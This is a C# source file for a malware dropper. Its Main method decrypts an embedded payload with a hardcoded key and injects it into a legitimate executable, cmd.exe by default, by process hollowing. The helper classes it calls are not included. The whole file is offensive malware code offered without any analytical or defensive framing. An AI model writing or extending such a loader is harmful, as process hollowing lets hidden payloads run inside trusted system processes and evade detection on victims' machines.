using System;
using System.Text;

namespace Dropper
{
    class Program
    {
        static void Main(string[] args)
        {
            try {
                string key = "F1lthyPig$";
                string path = args.Length > 0 ? args[0] : 
                    Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
                
                if (!System.IO.File.Exists(path)) {
                    throw new System.IO.FileNotFoundException("Target executable not found", path);
                }

                if (!Process.Hollow(Payload.GetPayload(key), path)) {
                    throw new Exception("Process hollowing failed");
                }
            }
            catch (Exception ex) {
                Console.Error.WriteLine("Fatal error: " + ex.Message);
                Environment.Exit(1);
            }
        }
    }
}
